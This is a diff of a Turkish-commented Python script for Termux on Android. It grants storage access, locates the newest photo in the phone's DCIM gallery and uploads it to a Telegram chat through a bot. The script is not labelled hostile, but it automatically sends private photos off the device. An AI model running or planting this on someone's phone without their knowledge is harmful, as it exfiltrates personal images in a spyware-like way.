@@ -15,23 +15,32 @@ def send_telegram_photo(photo_path):
         data = {"chat_id": CHAT_ID}
         try:
             response = requests.post(url, files=files, data=data)
-            print(response.json())
+            if response.status_code == 200:
+                print("✅ Fotoğraf başarıyla gönderildi!")
+            else:
+                print(f"❌ Telegram hata verdi: {response.json()}")
         except Exception as e:
-            print(f"Fotoğraf gönderme hatası: {e}")
+            print(f"⚠️ Fotoğraf gönderme hatası: {e}")
 
-# Termux depolama erişimi için izin al
+# 📌 Termux depolama izni al
 os.system("termux-setup-storage")
-time.sleep(2)  # İzin işlemi için bekleme süresi
+time.sleep(2)  # Yetki alması için bekle
 
-# Medya dosyalarını tarat
-os.system("termux-media-scan ~/storage/dcim")
+# 📌 Depolama dizinini belirle (Android 11+ için güvenli yol)
+storage_path = "/data/data/com.termux/files/home/storage/dcim"
 
-# Galerideki ilk fotoğrafı bul
-photo_list = glob.glob("/data/data/com.termux/files/home/storage/dcim/*/*.jpg") + \
-             glob.glob("/data/data/com.termux/files/home/storage/dcim/*/*.png")
+# 📌 Galerideki en son çekilmiş fotoğrafı bul
+photo_list = sorted(
+    glob.glob(f"{storage_path}/**/*.jpg", recursive=True) + 
+    glob.glob(f"{storage_path}/**/*.png", recursive=True) +
+    glob.glob(f"{storage_path}/**/*.jpeg", recursive=True),
+    key=os.path.getctime,  # 📌 Dosya oluşturma tarihine göre sırala
+    reverse=True  # 📌 En yeni fotoğraf en başta olsun
+)
 
 if photo_list:
-    first_photo = photo_list[0]
-    send_telegram_photo(first_photo)
+    last_photo = photo_list[0]
+    print(f"📷 Gönderilecek fotoğraf: {last_photo}")
+    send_telegram_photo(last_photo)
 else:
-    print("Galeri boş veya erişim izni yok.")
+    print("⚠️ Galeri boş veya erişim izni yok.")
